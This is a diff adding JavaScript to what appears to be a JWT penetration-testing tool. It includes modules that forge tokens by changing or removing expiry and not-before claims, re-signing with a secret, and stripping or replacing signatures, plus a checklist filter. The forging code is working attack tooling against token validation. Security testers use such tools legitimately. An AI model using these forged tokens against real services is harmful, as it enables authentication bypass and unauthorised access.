+  const newPayload = { ...parsed.payload };
+
+  if (type === 'extend') {
+    const h = parseInt(document.getElementById('expExtendHours').value)||8760;
+    newPayload.exp = now + h * 3600;
+  } else if (type === 'remove') {
+    delete newPayload.exp;
+  } else if (type === 'past') {
+    newPayload.exp = now + 10 * 365 * 24 * 3600; // 10 years
+  } else if (type === 'replay') {
+    // keep original exp unchanged — test replay of expired token
+  } else if (type === 'nbf') {
+    delete newPayload.nbf; // remove nbf to bypass not-before
+    newPayload.iat = now - 3600;
+  }
+
+  const newHeader = { ...parsed.header };
+  if (alg !== 'none') newHeader.alg = alg;
+  const hEnc = b64UrlEncode(JSON.stringify(newHeader));
+  const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+  let sig = '';
+  if (secret && alg !== 'none') sig = await hmacSign(secret, hEnc + '.' + pEnc, alg) || '';
+  else sig = parsed.sig;
+  const token = hEnc + '.' + pEnc + '.' + sig;
+  atkRenderToken('expOut', token);
+  document.getElementById('expResult').classList.add('show');
+  showToast('Expiry-manipulated token generated');
+}
+
+// ── MODULE 7: Signature Stripping ──
+async function runSigStrip() {
+  const parsed = atkGetParsed();
+  if (!parsed) return;
+  const type = getAtkVariantVal('sigStripType') || 'empty';
+  const customPayloadStr = document.getElementById('sigStripPayload').value.trim();
+  const newPayload = customPayloadStr ? (jsonParse(customPayloadStr) || parsed.payload) : parsed.payload;
+  const hEnc = b64UrlEncode(JSON.stringify(parsed.header));
+  const pEnc = b64UrlEncode(JSON.stringify(newPayload));
+  let sig = '';
+  if (type === 'empty')    sig = '';
+  if (type === 'nodot')    { atkRenderToken('sigStripOut', hEnc + '.' + pEnc); document.getElementById('sigStripResult').classList.add('show'); return; }
+  if (type === 'truncate') sig = (parsed.sig || 'abcd').slice(0, 4);
+  if (type === 'zeros')    sig = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+  if (type === 'random')   { const r = new Uint8Array(32); crypto.getRandomValues(r); sig = btoa(String.fromCharCode(...r)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); }
+  if (type === 'nullbyte') sig = 'AA==';
+  const token = hEnc + '.' + pEnc + '.' + sig;
+  atkRenderToken('sigStripOut', token);
+  document.getElementById('sigStripResult').classList.add('show');
+  showToast('Stripped signature token generated');
+}
+
+/* ═══════════════════════════════════════════════════════
+   Checklist Filter & Search
+═══════════════════════════════════════════════════════ */
+let clActiveFilter = 'all';
+let clActiveSearch = '';
+
+function updateChecklist() {
+  const search = clActiveSearch.toLowerCase().trim();
+  const filter = clActiveFilter;
+  let visible = 0;
+
+  document.querySelectorAll('#tab-checklist .checklist-section').forEach(section => {
+    let sectionHasVisible = false;
+    section.querySelectorAll('tr[data-risk]').forEach(row => {
+      const risk = row.getAttribute('data-risk') || '';
+      const text = (row.getAttribute('data-text') || '') + ' ' + (row.textContent || '');
+      const matchFilter = filter === 'all' || risk === filter;
+      const matchSearch = !search || text.toLowerCase().includes(search);
+      if (matchFilter && matchSearch) {
+        row.classList.remove('cl-hidden');
+        sectionHasVisible = true;
+        visible++;
+      } else {
+        row.classList.add('cl-hidden');
+      }
+    });
+    section.classList.toggle('cl-hidden', !sectionHasVisible);
+  });
+
+  const counter = document.getElementById('clCounter');
+  if (counter) counter.textContent = visible + ' item' + (visible !== 1 ? 's' : '');
+}
+
+function filterChecklist(val) {
+  clActiveSearch = val;
+  updateChecklist();
+}
+
+function setCLFilter(f, btn) {
+  clActiveFilter = f;
+  document.querySelectorAll('.cl-filter-btn').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  updateChecklist();
+}
+
 /* ═══════════════════════════════════════════════════════
    Init
 ═══════════════════════════════════════════════════════ */
 loadDefaultWordlist();
+// Init checklist counter
+setTimeout(updateChecklist, 100);
 </script>
 </body>
 </html>
